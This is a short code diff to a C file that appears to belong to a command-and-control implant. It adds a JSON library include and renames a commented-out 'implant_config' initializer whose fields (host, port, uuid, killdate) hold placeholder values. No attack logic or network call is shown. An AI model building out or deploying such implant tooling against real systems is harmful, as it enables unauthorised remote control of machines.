@@ -5,6 +5,7 @@
 #include <stdbool.h>
 #include <stdio.h>
 #include <string.h>
+#include "cJSON.h"
 typedef struct {
     int port; 
     int interval; 
@@ -22,7 +23,7 @@ typedef struct {
     char killdate[32];  //
 } implant_config;
 
-//implant_config config_r = {
+//implant_config config = {
 //    .host = "REPLACE_ME_HOST",
 //    .port = REPLACE_ME_PORT,     
 //    .uuid = "REPLACE_ME_UUID",
